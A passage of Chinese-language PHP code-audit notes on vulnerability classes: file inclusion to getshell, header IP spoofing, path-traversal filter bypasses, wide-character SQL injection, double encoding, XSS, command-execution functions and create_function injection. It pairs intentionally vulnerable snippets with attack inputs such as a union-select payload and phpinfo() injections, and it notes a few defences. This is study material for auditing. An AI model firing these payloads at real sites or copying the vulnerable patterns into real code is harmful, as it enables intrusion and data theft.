<span class="pl-s1">        <span class="pl-k">public</span> <span class="pl-smi">$file</span>;</span>
<span class="pl-s1">        <span class="pl-k">function</span> <span class="pl-c1">__construct</span>(<span class="pl-smi">$filename</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>pctf.php<span class="pl-pds">'</span></span>) {</span>
<span class="pl-s1">            <span class="pl-smi">$this</span> <span class="pl-k">-&gt;</span> <span class="pl-c1">file</span> <span class="pl-k">=</span> <span class="pl-smi">$filename</span>;</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">        </span>
<span class="pl-s1">        <span class="pl-k">function</span> <span class="pl-en">readfile</span>() {</span>
<span class="pl-s1">            <span class="pl-k">if</span> (<span class="pl-k">!</span><span class="pl-c1">empty</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>) <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span>..<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span>  </span>
<span class="pl-s1">            <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>)<span class="pl-k">===</span><span class="pl-c1">FALSE</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">stripos</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>,<span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\</span><span class="pl-pds">'</span></span>)<span class="pl-k">==</span><span class="pl-c1">FALSE</span>) {</span>
<span class="pl-s1">                <span class="pl-k">return</span> <span class="pl-k">@</span><span class="pl-c1">file_get_contents</span>(<span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">file</span>);</span>
<span class="pl-s1">            }</span>
<span class="pl-s1">        }</span>
<span class="pl-s1">    }</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span></pre></div>
<h2>
<a id="user-content-文件包含" class="anchor" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>文件包含</h2>
<p>原理：</p>
<p>include()/include_once()，require()/require_once()，中的变量可控</p>
<p>利用过程：</p>
<pre><code>上传图片（含有php代码的图片） 
读文件，读php文件 
包含日志文件getshell 
包含/proc/self/envion文件getshell 
如果有phpinfo可以包含临时文件 
包含data://或php://input等伪协议（需要allow_url_include=On)
</code></pre>
<p>封闭协议：</p>
<pre><code>file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
</code></pre>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 访问共享目录</span></span>
<span class="pl-s1"><span class="pl-k">include</span> (<span class="pl-s"><span class="pl-pds">'</span>\evilservershell.php<span class="pl-pds">'</span></span>);</span></pre></div>
<h2>
<a id="user-content-提交参数无过滤" class="anchor" href="#%E6%8F%90%E4%BA%A4%E5%8F%82%E6%95%B0%E6%97%A0%E8%BF%87%E6%BB%A4" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>提交参数无过滤</h2>
<p>原理:过滤了GPC，但没有过滤其它部分。</p>
<div class="highlight highlight-source-shell"><pre>上传文件相关变量如<span class="pl-smi">$_FIle</span>
<span class="pl-smi">$_GET</span>，<span class="pl-smi">$_POST</span>，<span class="pl-smi">$_Cookie</span>，<span class="pl-smi">$_SERVER</span>，<span class="pl-smi">$_ENV</span>，<span class="pl-smi">$_SESSION</span>，<span class="pl-smi">$_REQUEST</span>
HTTP_CLIENT_IP 和HTTP_XFORWORDFOR 中的ip不受gpc影响
<span class="pl-smi">$_HTTP_COOKIE_VARS</span>
<span class="pl-smi">$_HTTP_ENV_VARS</span>
<span class="pl-smi">$_HTTP_GET_VARS</span>
<span class="pl-smi">$_HTTP_POST_FILES</span>
<span class="pl-smi">$_HTTP_POST_VARS</span>
<span class="pl-smi">$_HTTP_SERVER_VARS</span></pre></div>
<p>案例：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-k">foreach</span>(<span class="pl-smi">$_COOKIE</span> <span class="pl-k">AS</span> <span class="pl-smi">$_key</span><span class="pl-k">=&gt;</span><span class="pl-smi">$_value</span>){</span>
<span class="pl-s1">	<span class="pl-c1">unset</span>(<span class="pl-smi">$$_key</span>);</span>
<span class="pl-s1">}</span>
<span class="pl-s1"><span class="pl-k">foreach</span>(<span class="pl-smi">$_POST</span> <span class="pl-k">AS</span> <span class="pl-smi">$_key</span><span class="pl-k">=&gt;</span><span class="pl-smi">$_value</span>){</span>
<span class="pl-s1">	<span class="pl-k">!</span><span class="pl-c1">ereg</span>(<span class="pl-s"><span class="pl-pds">"</span>^\_[A-Z]+<span class="pl-pds">"</span></span>,<span class="pl-smi">$_key</span>) <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$$_key</span><span class="pl-k">=</span><span class="pl-smi">$_POST</span>[<span class="pl-smi">$_key</span>];</span>
<span class="pl-s1">}</span>
<span class="pl-s1"><span class="pl-k">foreach</span>(<span class="pl-smi">$_GET</span> <span class="pl-k">AS</span> <span class="pl-smi">$_key</span><span class="pl-k">=&gt;</span><span class="pl-smi">$_value</span>){</span>
<span class="pl-s1">	<span class="pl-k">!</span><span class="pl-c1">ereg</span>(<span class="pl-s"><span class="pl-pds">"</span>^\_[A-Z]+<span class="pl-pds">"</span></span>,<span class="pl-smi">$_key</span>) <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$$_key</span><span class="pl-k">=</span><span class="pl-smi">$_GET</span>[<span class="pl-smi">$_key</span>];</span>
<span class="pl-s1">}</span></pre></div>
<p>通过表单来传值。</p>
<div class="highlight highlight-text-html-basic"><pre>&lt;<span class="pl-ent">form</span> <span class="pl-e">method</span>=<span class="pl-s"><span class="pl-pds">"</span>post<span class="pl-pds">"</span></span> <span class="pl-e">action</span>=<span class="pl-s"><span class="pl-pds">"</span>http://localhost/qibo/member/comment.php?job=ifcom<span class="pl-pds">"</span></span> <span class="pl-e">enctype</span>=<span class="pl-s"><span class="pl-pds">"</span>multipart/form-data<span class="pl-pds">"</span></span>&gt;
&lt;<span class="pl-ent">input</span> <span class="pl-e">type</span>=<span class="pl-s"><span class="pl-pds">"</span>file<span class="pl-pds">"</span></span> <span class="pl-e">name</span>=<span class="pl-s"><span class="pl-pds">"</span>cidDB<span class="pl-pds">"</span></span>&gt;  
&lt;<span class="pl-ent">input</span> <span class="pl-e">type</span>=<span class="pl-s"><span class="pl-pds">"</span>submit<span class="pl-pds">"</span></span>&gt;
&lt;/<span class="pl-ent">form</span>&gt;</pre></div>
<p>这里的gid为查询参数</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-smi">$_SERVER</span>                 <span class="pl-c"><span class="pl-c">//</span>中用户能够控制的变量，php5.0后不受GPC影响</span></span>
<span class="pl-s1"><span class="pl-c1">QUERY_STRING</span>             <span class="pl-c"><span class="pl-c">//</span>用户GET方法提交时的查询字符串</span></span>
<span class="pl-s1"><span class="pl-c1">HTTP_REFERER</span>             <span class="pl-c"><span class="pl-c">//</span>用户请求的来源变量，在一些程序取得用户访问记录时用得比较多</span></span>
<span class="pl-s1"><span class="pl-c1">HTTP_USER_AGENT</span>          <span class="pl-c"><span class="pl-c">//</span>用户的浏览器类型，也用于用户的访问记录的取得</span></span>
<span class="pl-s1"><span class="pl-c1">HTTP_HOST</span>                <span class="pl-c"><span class="pl-c">//</span>提交的主机头等内容</span></span>
<span class="pl-s1"><span class="pl-c1">HTTP_X_FORWARDED_FOR</span>     <span class="pl-c"><span class="pl-c">//</span>用户的代理主机的信息</span></span></pre></div>
<h2>
<a id="user-content-伪造ip" class="anchor" href="#%E4%BC%AA%E9%80%A0ip" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>伪造IP</h2>
<p>原理:
以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1">关键字：</span>
<span class="pl-s1"><span class="pl-c1">HTTP_</span></span>
<span class="pl-s1"><span class="pl-c1">getenv</span></span>
<span class="pl-s1"><span class="pl-smi">$_SERVER</span></span>
<span class="pl-s1">服务端：</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-c1">getenv</span>(<span class="pl-s"><span class="pl-pds">'</span>HTTP_CLIENT_IP<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$_SERVER</span>[<span class="pl-s"><span class="pl-pds">'</span>REMOTE_ADDR<span class="pl-pds">'</span></span>]; <span class="pl-c"><span class="pl-c">//</span>访问端（有可能是用户，有可能是代理的）IP</span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$_SERVER</span>[<span class="pl-s"><span class="pl-pds">'</span>HTTP_CLIENT_IP<span class="pl-pds">'</span></span>]; <span class="pl-c"><span class="pl-c">//</span>代理端的（有可能存在，可伪造）</span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$_SERVER</span>[<span class="pl-s"><span class="pl-pds">'</span>HTTP_X_FORWARDED_FOR<span class="pl-pds">'</span></span>]; <span class="pl-c"><span class="pl-c">//</span>用户是在哪个IP使用的代理（有可能存在，也可以伪造）</span></span>
<span class="pl-s1">客户端：</span>
<span class="pl-s1">注意发送的格式：</span>
<span class="pl-s1"><span class="pl-c1">CLIENT</span><span class="pl-k">-</span><span class="pl-c1">IP</span>:<span class="pl-c1">10.10</span><span class="pl-k">.</span><span class="pl-c1">10.1</span></span>
<span class="pl-s1"><span class="pl-c1">X</span><span class="pl-k">-</span><span class="pl-c1">FORWARDED</span><span class="pl-k">-</span><span class="pl-c1">FOR</span>:<span class="pl-c1">10.10</span><span class="pl-k">.</span><span class="pl-c1">10.10</span></span></pre></div>
<pre><code>这个玩意恒成立的。不管有没有clientip
【strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')】
</code></pre>
<h2>
<a id="user-content-绕过正则匹配" class="anchor" href="#%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>绕过正则匹配</h2>
<h3>
<a id="user-content-缺少和限定" class="anchor" href="#%E7%BC%BA%E5%B0%91%E5%92%8C%E9%99%90%E5%AE%9A" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>缺少^和$限定</h3>
<h3>
<a id="user-content-数组绕过正则" class="anchor" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%E6%AD%A3%E5%88%99" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>数组绕过正则</h3>
<p>【\A[ _a-zA-Z0-9]+\z】</p>
<h3>
<a id="user-content-str_replace路径穿越" class="anchor" href="#str_replace%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>str_replace路径穿越</h3>
<p>原理
str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 这里可以被绕过，因为是对.和/或\的组合的过滤，所以单独的..或\/没有检测到。</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 方法1</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 五个点加///</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 方法2</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ...././/</span></span>
<span class="pl-s1"><span class="pl-smi">$dir</span> <span class="pl-k">=</span> <span class="pl-c1">str_replace</span>(<span class="pl-c1">array</span>(<span class="pl-s"><span class="pl-pds">'</span>..<span class="pl-cce">\\</span><span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>../<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>./<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>.<span class="pl-cce">\\</span><span class="pl-pds">'</span></span>), <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>, <span class="pl-c1">trim</span>(<span class="pl-smi">$dir</span>),<span class="pl-smi">$countb</span>);</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$dir</span>;</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;/br&gt;替换数量<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$countb</span>;</span></pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 这里有对单独的.进行过滤，所以无法绕过。</span></span>
<span class="pl-s1"><span class="pl-smi">$file</span> <span class="pl-k">=</span> <span class="pl-c1">str_replace</span>(<span class="pl-c1">array</span>(<span class="pl-s"><span class="pl-pds">'</span>../<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\</span><span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>..<span class="pl-pds">'</span></span>), <span class="pl-c1">array</span>(<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>/<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>), <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>file<span class="pl-pds">'</span></span>],<span class="pl-smi">$counta</span>);</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$file</span>;</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>&lt;/br&gt;替换数量<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$counta</span>;</span></pre></div>
<h2>
<a id="user-content-short_open_tagon-短标签" class="anchor" href="#short_open_tagon-%E7%9F%AD%E6%A0%87%E7%AD%BE" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>short_open_tag=on 短标签</h2>
<p>原理：
当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；
格式为：<?xxxx ;?> --&gt; &lt;?xxx;</p>
<div class="highlight highlight-source-shell"><pre>Go0s@ubuntu:<span class="pl-k">~</span>$ cat test.php
<span class="pl-k">&lt;</span><span class="pl-k">?</span>=<span class="pl-s"><span class="pl-pds">"</span>helloworld<span class="pl-pds">"</span></span><span class="pl-k">;</span>
Go0s@ubuntu:<span class="pl-k">~</span>$ curl 127.0.0.1/test.php
helloworld</pre></div>
<h2>
<a id="user-content-file_put_contents第二个参数传入数组" class="anchor" href="#file_put_contents%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>file_put_contents第二个参数传入数组</h2>
<p>原理：</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">file_put_contents</span>(<span class="pl-c1">file</span>,<span class="pl-c1">data</span>,<span class="pl-c1">mode</span>,<span class="pl-c1">context</span>)</span>
<span class="pl-s1"><span class="pl-c1">file</span>	必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。</span>
<span class="pl-s1"><span class="pl-c1">data</span>	可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。</span></pre></div>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 这个要从burp去传，因为后面的【?】会被理解为参数而截断</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-smi">$a</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>data<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1"><span class="pl-smi">$file</span> <span class="pl-k">=</span> <span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>filename<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1"><span class="pl-smi">$current</span> <span class="pl-k">=</span> <span class="pl-c1">file_get_contents</span>(<span class="pl-smi">$file</span>);</span>
<span class="pl-s1"><span class="pl-c1">file_put_contents</span>(<span class="pl-smi">$file</span>, <span class="pl-smi">$a</span>);</span></pre></div>
<h2>
<a id="user-content-单引号和双引号" class="anchor" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>单引号和双引号</h2>
<p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 1</span></span>
<span class="pl-s1"><span class="pl-smi">$s</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>I am a 'single quote string' inside a double quote string<span class="pl-pds">"</span></span>; </span>
<span class="pl-s1"><span class="pl-smi">$s</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>I am a "double quote string" inside a single quote string<span class="pl-pds">'</span></span>; </span>
<span class="pl-s1"><span class="pl-smi">$s</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>I am a 'single quote string' inside a double quote string<span class="pl-pds">"</span></span>; </span>
<span class="pl-s1"><span class="pl-smi">$s</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>I am a "double quote string" inside a single quote string<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 2</span></span>
<span class="pl-s1"><span class="pl-smi">$abc</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>I love u<span class="pl-pds">'</span></span>; </span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$abc</span> <span class="pl-c"><span class="pl-c">//</span>结果是:I love u </span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>$abc<span class="pl-pds">'</span></span> <span class="pl-c"><span class="pl-c">//</span>结果是:$abc </span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$abc</span><span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">//</span>结果是:I love u </span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 3</span></span>
<span class="pl-s1"><span class="pl-smi">$a</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>${@phpinfo()}<span class="pl-pds">"</span></span>; <span class="pl-c"><span class="pl-c">//</span>可以解析出来</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span> <span class="pl-smi">$a</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>${@phpinfo()}<span class="pl-pds">"</span></span>;</span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span> //@可以为空格，tab，/**/ ，回车，+，-，!，~,\等</pre></div>
<h3>
<a id="user-content-查询语句缺少单引号" class="anchor" href="#%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%BC%BA%E5%B0%91%E5%8D%95%E5%BC%95%E5%8F%B7" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>查询语句缺少单引号</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-s"><span class="pl-pds">"</span>Select * from table where id=<span class="pl-smi">$id</span><span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 有注入</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">"</span>Select * from table where id=<span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-smi">$id</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span> limit 1<span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 有注入</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">"</span>Select * from table where id='<span class="pl-smi">$id</span>'<span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 无注入</span></span>
<span class="pl-s1"><span class="pl-s"><span class="pl-pds">"</span>Select * from table where id='<span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-smi">$id</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span>' limit 1<span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 无注入</span></span></pre></div>
<h2>
<a id="user-content-宽字符注入" class="anchor" href="#%E5%AE%BD%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>宽字符注入</h2>
<p>原理
常见转码函数：
iconv()
mb_convert_encoding()
addslashes
防御：
用mysql_real_escape_string</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># ?username=tom&amp;password=1%df' or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># %df把\给吃掉</span></span>
<span class="pl-s1"><span class="pl-smi">$pwd</span> <span class="pl-k">=</span> <span class="pl-c1">addslashes</span>(<span class="pl-smi">$pwd</span>);</span>
<span class="pl-s1"><span class="pl-c1">mysql_query</span>(<span class="pl-s"><span class="pl-pds">"</span>SET NAMES gbk<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1"><span class="pl-smi">$query</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>select * from user where uname='<span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-smi">$uname</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span>' and pwd='<span class="pl-pds">"</span></span><span class="pl-k">.</span><span class="pl-smi">$pwd</span><span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">"</span>'<span class="pl-pds">"</span></span>;</span></pre></div>
<h2>
<a id="user-content-跳转无退出" class="anchor" href="#%E8%B7%B3%E8%BD%AC%E6%97%A0%E9%80%80%E5%87%BA" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>跳转无退出</h2>
<p>原理:
没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 1</span></span>
<span class="pl-s1"><span class="pl-smi">$this</span><span class="pl-k">-&gt;</span><span class="pl-smi">myclass</span><span class="pl-k">-&gt;</span>notice(<span class="pl-s"><span class="pl-pds">'</span>alert("系统已安装过");window.location.href="<span class="pl-pds">'</span></span><span class="pl-k">.</span>site_url()<span class="pl-k">.</span><span class="pl-s"><span class="pl-pds">'</span>";<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 2</span></span>
<span class="pl-s1"><span class="pl-c1">header</span>(<span class="pl-s"><span class="pl-pds">"</span>location: ../index.php<span class="pl-pds">"</span></span>);</span></pre></div>
<h2>
<a id="user-content-二次编码注入" class="anchor" href="#%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>二次编码注入</h2>
<p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。
如%2527，两次urldecode会最后变成'</p>
<pre><code>base64_decode -- 对使用 MIME base64 编码的数据进行解码
base64_encode -- 使用 MIME base64 对数据进行编码
rawurldecode -- 对已编码的 URL 字符串进行解码
rawurlencode -- 按照 RFC 1738 对 URL 进行编码
urldecode -- 解码已编码的 URL 字符串
urlencode -- 编码 URL 字符串
unserialize/serialize
字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等
</code></pre>
<h2>
<a id="user-content-前端可控变量填充导致xss" class="anchor" href="#%E5%89%8D%E7%AB%AF%E5%8F%AF%E6%8E%A7%E5%8F%98%E9%87%8F%E5%A1%AB%E5%85%85%E5%AF%BC%E8%87%B4xss" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>前端可控变量填充导致XSS</h2>
<p>当html里的链接是变量时，易出现XSS。</p>
<div class="highlight highlight-text-html-basic"><pre>={#、echo、print、printf、vprintf、&lt;%=$test%&gt;
img scr={#$list.link_logo#}</pre></div>
<h2>
<a id="user-content-命令执行函数" class="anchor" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>命令执行函数</h2>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c1">system</span>()</span>
<span class="pl-s1"><span class="pl-c1">exec</span>()</span>
<span class="pl-s1"><span class="pl-c1">passthru</span>()</span>
<span class="pl-s1"><span class="pl-c1">pcntl_exec</span>()</span>
<span class="pl-s1"><span class="pl-c1">shell_exec</span>()</span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">`</span>whoami<span class="pl-pds">`</span></span>; <span class="pl-c"><span class="pl-c">//</span>反引号调用shell_exec()函数</span></span>
<span class="pl-s1"><span class="pl-c1">popen</span>()和<span class="pl-c1">proc_open</span>() <span class="pl-c"><span class="pl-c">//</span>不会返回结果</span></span>
<span class="pl-s1"><span class="pl-c1">array_map</span>(<span class="pl-smi">$arr</span>,<span class="pl-smi">$array</span>); <span class="pl-c"><span class="pl-c">//</span>为数组的每个元素应用回调函数arr,如$arr = "phpinfo"</span></span>
<span class="pl-s1"><span class="pl-c1">popen</span>(<span class="pl-s"><span class="pl-pds">'</span>whoami &gt;&gt;D: /2.txt<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>r<span class="pl-pds">'</span></span>); <span class="pl-c"><span class="pl-c">//</span>这样就会在D下生成一个2.txt。</span></span>
<span class="pl-s1"><span class="pl-c1">preg_replace</span>()</span>
<span class="pl-s1"><span class="pl-c1">ob_start</span>()</span>
<span class="pl-s1"><span class="pl-c1">array_map</span>()</span></pre></div>
<p>防范方法：
使用自定义函数或函数库来替代外部命令的功能
使用escapeshellarg 函数来处理命令参数
使用safe_mode_exec_dir 指定可执行文件的路径</p>
<h3>
<a id="user-content-create_function" class="anchor" href="#create_function" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>create_function</h3>
<p>create_function构造了一个return后面的语句为一个函数。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?sort_by="]);}phpinfo();/*</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>sort_function就变成了 return 1 * strnatcasecmp($a[""]);}phpinfo();/*"], $b[""]);}phpinfo();/*"]);</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>前面闭合，然后把后面的全部注释掉了。</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-smi">$sort_by</span><span class="pl-k">=</span><span class="pl-smi">$_GET</span>[<span class="pl-s"><span class="pl-pds">'</span>sort_by<span class="pl-pds">'</span></span>];</span>
<span class="pl-s1"><span class="pl-smi">$sorter</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>strnatcasecmp<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1"><span class="pl-smi">$databases</span><span class="pl-k">=</span><span class="pl-c1">array</span>(<span class="pl-s"><span class="pl-pds">'</span>test<span class="pl-pds">'</span></span>,<span class="pl-s"><span class="pl-pds">'</span>test<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-smi">$sort_function</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span> return 1 * <span class="pl-pds">'</span></span> <span class="pl-k">.</span> <span class="pl-smi">$sorter</span> <span class="pl-k">.</span> <span class="pl-s"><span class="pl-pds">'</span>($a["<span class="pl-pds">'</span></span> <span class="pl-k">.</span> <span class="pl-smi">$sort_by</span> <span class="pl-k">.</span> <span class="pl-s"><span class="pl-pds">'</span>"], $b["<span class="pl-pds">'</span></span> <span class="pl-k">.</span> <span class="pl-smi">$sort_by</span> <span class="pl-k">.</span> <span class="pl-s"><span class="pl-pds">'</span>"]);<span class="pl-pds">'</span></span>;</span>
